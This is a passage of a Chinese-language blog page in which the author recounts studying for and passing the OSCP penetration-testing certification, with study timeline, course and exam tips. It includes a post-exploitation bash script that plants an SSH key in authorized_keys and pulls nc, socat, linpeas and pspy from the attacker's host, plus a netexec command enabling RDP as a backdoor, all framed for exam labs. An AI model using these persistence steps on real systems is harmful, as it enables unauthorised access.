@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+<meta name="baidu-site-verification" content="codeva-l4PbCwKc7Z">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="FEUc84rh7dgaXl_JOY_Bq7sulvZljH">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monaco:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.thiiiiink.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="从2024年10月份开始学习到25年4月初通过考试，总计花费5个月时间，本文是我对OSCP考试经历的总结分享">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCP认证总结">
+<meta property="og:url" content="https://www.thiiiiink.com/post/20250503151126.html">
+<meta property="og:site_name" content="临渊羡鱼">
+<meta property="og:description" content="从2024年10月份开始学习到25年4月初通过考试，总计花费5个月时间，本文是我对OSCP考试经历的总结分享">
+<meta property="og:locale">
+<meta property="article:published_time" content="2025-05-03T07:11:26.000Z">
+<meta property="article:modified_time" content="2025-09-30T07:37:03.964Z">
+<meta property="article:author" content="Yiaos">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://www.thiiiiink.com/post/20250503151126.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>OSCP认证总结 | 临渊羡鱼</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-J67WGCEZY5"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-J67WGCEZY5');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?257c5564d6a2b53ffc355cd89f5f2095";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">临渊羡鱼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">退而结网</p>
+      <a>
+        <img class="custom-logo-image" src="/images/avatar.gif" alt="临渊羡鱼">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://www.thiiiiink.com/post/20250503151126.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yiaos">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="临渊羡鱼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          OSCP认证总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-05-03 15:11:26" itemprop="dateCreated datePublished" datetime="2025-05-03T15:11:26+08:00">2025-05-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-09-30 15:37:03" itemprop="dateModified" datetime="2025-09-30T15:37:03+08:00">2025-09-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Got-%E8%87%AD%E9%B1%BC%E7%83%82%E8%99%BE/" itemprop="url" rel="index"><span itemprop="name">What We Got-臭鱼烂虾</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Got-%E8%87%AD%E9%B1%BC%E7%83%82%E8%99%BE/OSCP/" itemprop="url" rel="index"><span itemprop="name">OSCP</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Got-%E8%87%AD%E9%B1%BC%E7%83%82%E8%99%BE/OSCP/PG-Lab/" itemprop="url" rel="index"><span itemprop="name">PG Lab</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">从2024年10月份开始学习到25年4月初通过考试，总计花费5个月时间，本文是我对OSCP考试经历的总结分享</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>考试之前也看了很多师傅们考OSCP的经验，有的师傅只简单过一下课程内容和challeng lab后就能通过考试，有些师傅考了几次都没有过。是否能通过认证考试取决于自己目前掌握知识水平和每天能在课程和Lab中花费的时间，所以不要拿自己和别人比较，我们也没法复制别人的学习路线。</p>
+<p>我的本职工作是后端开发，因为对安全比较感兴趣，之前零散学过一些知识，现在准备转行，萌生了考个证书作为敲门砖的想法，最初准备考CISP-PTE，在了解OSCP之后，发现差不多的价钱OSCP更有含金量。<br>本文内容请基于我已掌握了以下知识来阅读：</p>
+<ul>
+<li>熟练使用linux</li>
+<li>掌握Python、Go、PHP语言</li>
+<li>英文阅读能力尚可，毕竟翻译软件我是会用的<br>同样地，以下内容只是一个刚通过OSCP考试的渗透测试初学者的经验，参考价值有限</li>
+</ul>
+<h2 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h2><p>从24年10月份开始学习到25年4月初通过考试，总计花费5个月时间。<br>2024.9底购买了offsec <a target="_blank" rel="external nofollow noopener noreferrer" href="https://portal.offsec.com/buy-more-select-product">90天课程+Exam package</a>, 趁着十一假期突击学习了一波<br>2024.10月至11月中旬，利用下班后的时间学完了课程内容，预约了元旦假期考试<br>2024.11月中旬-2025.1，因为公司春节活动，包括周末在内每天高强度加班，期间没看课程相关内容, 期间又改了2次考试时间<br>2024.12月底，课程过期，Challenge Lab只做过第一个Secura<br>2025.1 购买<a target="_blank" rel="external nofollow noopener noreferrer" href="https://portal.offsec.com/labs/practice">Proving Grounds Practice</a>，按照<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">TjNull List</a>开始联系Machine<br>2025.2 又续了一个月，但是因为考试预约时间已经改了2次了，也不想继续拖下去，在元宵节前的周末参加了考试，此时总计刷了大概15台Machine, 结果毫无疑问地挂了，得了20分<br>2025.3月初，订阅Learning Unlimited后，本着这次不过1个月后还能再来一次的想法，预约了3月底的考试<br>2025.4.1 考试通过</p>
+<blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://discord.gg/G2Mge4JC">Discord</a>里的有个师傅公司有22% off, Discord里也有很多备考经验分享, 每天看看师傅们讨论也能学习到不少知识, 氛围非常友好活跃。即使问一些很初级的问题，师傅们也会耐心解答，给我的备考帮助很大，在这里感谢师傅们</p>
+</blockquote>
+<p>为什么选择Learn Unlimitd?<br>因为当时课程已经结束，而Challenge Lab我还没有做，如果续lab(30天)+补考的话需要$359+$249，实在是有点太贵了，并且当时有点没信心，如果考不过的话补考又需要$249。此外，我希望能继续学习其他课程，掌握更多知识，因此Learn Unlimited在当时是最佳选择。</p>
+<h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><h3 id="我学到了什么"><a href="#我学到了什么" class="headerlink" title="我学到了什么"></a>我学到了什么</h3><ol>
+<li>PEN-200课程给我最大的感受是它是在教学生构建自己的方法论，这点对现阶段的我来说非常适用，课程结束之后对渗透测试有了初步的完整轮廓</li>
+<li>Windows以及AD是我此前完全不懂的内容，通过课程学习之后对这部分基础有了一定认识</li>
+<li>英语阅读能力得到了提升，之前看到大篇幅的英文文档时，第一想法是用翻译软件翻译，但是因为有些翻译不达意，逐渐养成了能静下心来逐句阅读的好习惯</li>
+</ol>
+<h3 id="一定要做的事"><a href="#一定要做的事" class="headerlink" title="一定要做的事"></a>一定要做的事</h3><ol>
+<li>课程中一定要做笔记，一方面系统梳理知识点，另一方面很多工具的常用参数记录下来，在考试时和日后工作中能快速检索。我认为笔记是能否通过考试的关键</li>
+<li>PG Machine是最好的练习，Machine肯定做的越多越好，毕竟我们的目的不只是通过考试，而是学习积累渗透测试经验，但话说回来，TjNull列表中的Machine刷完就足以应对考试了</li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.youtube.com/watch?v=gY_9Dncjw-s">Drrow C</a> play list在考试前一定要过一遍，AD思路基本可以应对考试</li>
+<li>Challenge Lab中OSCP A&#x2F;B&#x2F;C中应该至少选择一个尝试在24小时内完成，并写一份完整的渗透测试报告（我没有写报告导致交报告时的时间很紧张）</li>
+</ol>
+<h3 id="其他重要的事"><a href="#其他重要的事" class="headerlink" title="其他重要的事"></a>其他重要的事</h3><ul>
+<li>熟练使用常用工具，你肯定不想在考试时调试使用不熟练的工具，我第一次考试就是 <code>ligolo-ng</code>掩码写错了，导致内网转发网络不通，还找了监考帮忙确认机器是否有问题，浪费了2个小时</li>
+<li>最终前人的经验总结，它们的背后应该都有一段血泪的经历，之前看到很多师傅说reverse shell时最好使用Machine自身开放的端口，而我此前一直用80或443没有遇到过问题，因此对此不以为意，直到我也有了一段惨痛的教训</li>
+<li>不要过于依赖自动化信息收集工具，练习手动信息收集很重要，甚至我们可以自己写一个收集信息的脚本，关键点在于我们需要知道哪些信息是需要关注的</li>
+<li>课程中文字内容比视频更详尽，推荐先阅读文字，如果有问题再结合视频看</li>
+<li>如果你和我一样是新手，建议多练习使用MSF，虽然在考试中对MSF的使用有限制，但是优秀工具的熟练使用对日后渗透测试应该是必须的</li>
+<li>每种类型的工具最好能熟练使用两个，一些固定常见操作可以写一个小脚本或者alias，考试时能节省一些时间<br>例如：</li>
+</ul>
+<ol>
+<li>alias： <code>ligolo=/home/kali/pentestools/Pivot/ligolo-ng/run_proxy.sh</code></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subnet=$1 # like 172.16.112.0/24</span><br><span class="line">sudo ip tuntap add user kali mode tun ligolo</span><br><span class="line">sudo ip link set ligolo up</span><br><span class="line">sudo ip route add $subnet dev ligolo</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>获取机器初始权限之后，从kali下载如下脚本，用来添加后门或者下载文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line">host=<span class="variable">$1</span></span><br><span class="line">host=<span class="string">&quot;http://<span class="variable">$host</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">shift</span></span><br><span class="line">tools=(<span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add id_ras.pub</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /home/`<span class="built_in">whoami</span>`/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ssh-rsa xxx kali@kali&#x27;</span> &gt; /home/`<span class="built_in">whoami</span>`/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义工具与文件名的对应关系</span></span><br><span class="line"><span class="built_in">declare</span> -A tool_map</span><br><span class="line">tool_map[<span class="string">&quot;nc&quot;</span>]=<span class="string">&quot;nc&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;socat&quot;</span>]=<span class="string">&quot;socat&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;linpeas&quot;</span>]=<span class="string">&quot;linpeas_linux_amd64&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;pspy&quot;</span>]=<span class="string">&quot;pspy64&quot;</span></span><br><span class="line">tool_map[<span class="string">&quot;pec.sh&quot;</span>]=<span class="string">&quot;pec.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历工具并下载</span></span><br><span class="line"><span class="keyword">for</span> tool <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;tools[@]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$&#123;tool_map[$tool]&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Downloading <span class="variable">$&#123;tool&#125;</span>...&quot;</span></span><br><span class="line">wget <span class="string">&quot;<span class="variable">$&#123;host&#125;</span>/linux/<span class="variable">$&#123;tool_map[$tool]&#125;</span>&quot;</span> -O <span class="variable">$tool</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="variable">$tool</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Download <span class="variable">$&#123;tool&#125;</span> Done&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Unknown tool: <span class="variable">$tool</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;All Done&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h2><h3 id="“技巧”"><a href="#“技巧”" class="headerlink" title="“技巧”"></a>“技巧”</h3><p>得益于国内应试教育的历练，我们都有很强的应对考试的能力。既然是考试，我认为多多少少会有一些所谓”技巧”, 以下综合自己的考试经历和多位师傅们的经验分享总结：</p>
+<ol>
+<li>手动枚举：考试中最重要的是枚举，比如提权时我们一般会优先使用一些自动化工具提高效率，但是有些考试机器被设置为需要手动枚举才能找到利用点，那手动枚举的关键点就是能找到 <code>考点</code>，在oscp中的考点就是 <code>find something unusual</code>,关于什么是unusual，在做过了PG Machine之后就会有明显的体会，比如一般情况下windows机器目录下有 <code>inetput</code>、<code>windows</code>、<code>users</code>、<code>Program Files(X86)</code>这几个 <code>usual</code>文件夹，除了这些之外就是 <code>unusual</code>, 如果发现像 <code>backup</code>、<code>ftp</code>或者某个程序的安装文件夹，那么基本可以确定下一步方向，在pg Machine中还遇到过有台机器中有个 <code>windows.old</code>。</li>
+<li>如果在登录机器后发现了nmap工具扫描没有发现的端口，也是值得关注的 <code>something unusual</code></li>
+<li>web枚举时，如果发现有员工介绍，这些名字往往可能就是username，再比如员工头像都是人像，而如果某个是卡通图片，往往也可能是关键信息，需要额外关注</li>
+<li>reverse shell选择常见的端口(比如53、443)以及机器自身开放的端口来绕过一些可能的限制</li>
+<li>爆破时使用字典rockyou.txt，如果没有结果使用 <code>rules/best64.rule</code>，如果仍没有结果，那么这台机器的”考点”基本上就不是密码爆破</li>
+<li>通过的关键：<code>Enumerate -&gt; Enumerate -&gt; Exploit -&gt; Enumerate -&gt; Get Creds/hashes -&gt; crackmapexec/nxc -&gt; Lateral Movement and repeat…</code></li>
+<li>获取权限之后修改密码或者设置后门 <code>netexec smb $IP -u administrator -p pass123 -M rdp -o ACTION=enable</code></li>
+</ol>
+<h2 id="关于报告"><a href="#关于报告" class="headerlink" title="关于报告"></a>关于报告</h2><p>官方的模板是word文档，我平时一般用markdown记笔记，所以想着用很多师傅在用的<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">OSCP-Exam-Report-Template-Markdown</a>生成报告，但是在生成报告时遇到了一些问题，又因为我写报告的时间比较晚，临近截止时间就直接Typro导出成pdf上交了。所以报告应该是能明确说明渗透路径就行，直接参考官方模板写应该是最简单的方式。</p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>别把证书看得过于重要，它虽然能在某种程度上证明我们的能力，并且本文都是在讲怎么通过认证考试，也介绍了一些关于考试的所谓”技巧”，但我认为OSCP的学习过程更重要，我们在获得认证的同时，更重要的是拥有成为能力全面的Penetratin tester的能力。反之如果这个证书没能给我们的生活工作带来任何帮助，那它就是一张废纸。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Yiaos
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://www.thiiiiink.com/post/20250503151126.html" title="OSCP认证总结">https://www.thiiiiink.com/post/20250503151126.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/post/20250311024935.html" rel="next" title="Proving Grounds Practice - Slort">
+      Proving Grounds Practice - Slort <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="nav-text">时间线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E8%AF%BE%E7%A8%8B"><span class="nav-text">关于课程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%91%E5%AD%A6%E5%88%B0%E4%BA%86%E4%BB%80%E4%B9%88"><span class="nav-text">我学到了什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%AE%9A%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B"><span class="nav-text">一定要做的事</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%87%8D%E8%A6%81%E7%9A%84%E4%BA%8B"><span class="nav-text">其他重要的事</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E8%80%83%E8%AF%95"><span class="nav-text">关于考试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9C%E6%8A%80%E5%B7%A7%E2%80%9D"><span class="nav-text">“技巧”</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E6%8A%A5%E5%91%8A"><span class="nav-text">关于报告</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E5%90%8E"><span class="nav-text">最后</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Yiaos</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yiaos</span>
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
